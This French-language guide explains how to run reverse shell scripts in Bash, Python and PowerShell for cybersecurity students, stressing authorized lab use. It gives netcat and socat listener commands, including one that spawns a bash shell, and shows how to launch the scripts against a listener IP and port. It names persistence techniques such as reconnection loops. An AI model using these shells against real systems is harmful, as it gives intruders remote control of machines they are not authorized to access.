# Guide d'utilisation des Reverse Shells - Cybersécurité

## AVERTISSEMENT IMPORTANT
Ces scripts sont fournis à des fins **ÉDUCATIVES UNIQUEMENT** pour les étudiants en cybersécurité. 
**UTILISEZ UNIQUEMENT dans des environnements de test autorisés et contrôlés.**

## Prérequis pour les tests
1. **Environnement de laboratoire isolé** (machines virtuelles, réseau isolé)
2. **Autorisation écrite** pour tous les tests
3. **Machine d'écoute** pour recevoir les connexions

## Configuration de l'environnement de test

### 1. Machine d'écoute (Attaquant simulé)
```bash
# Avec netcat
nc -lvp 4444

# Avec netcat moderne
ncat -lvp 4444

# Avec socat
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### 2. Utilisation des scripts

#### Bash (Linux/macOS)
```bash
chmod +x reverse_shell_bash.sh
./reverse_shell_bash.sh 192.168.1.100 4444
```

#### Python (Multi-plateforme)
```bash
python3 reverse_shell_python.py 192.168.1.100 4444
```

#### PowerShell (Windows)
```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
.\reverse_shell_powershell.ps1 -TargetIP "192.168.1.100" -TargetPort 4444
```

## Concepts pédagogiques couverts

### 1. **Redirection de flux**
- Redirection des entrées/sorties standard
- Utilisation de `/dev/tcp` sous bash
- Manipulation des descripteurs de fichiers

### 2. **Sockets réseau**
- Connexions TCP client/serveur
- Gestion des erreurs de connexion
- Timeouts et reconnexion

### 3. **Exécution de commandes**
- `subprocess` en Python
- `Invoke-Expression` en PowerShell
- Gestion des erreurs d'exécution

### 4. **Techniques de persistance**
- Boucles de reconnexion
- Gestion des interruptions
- Nettoyage des ressources


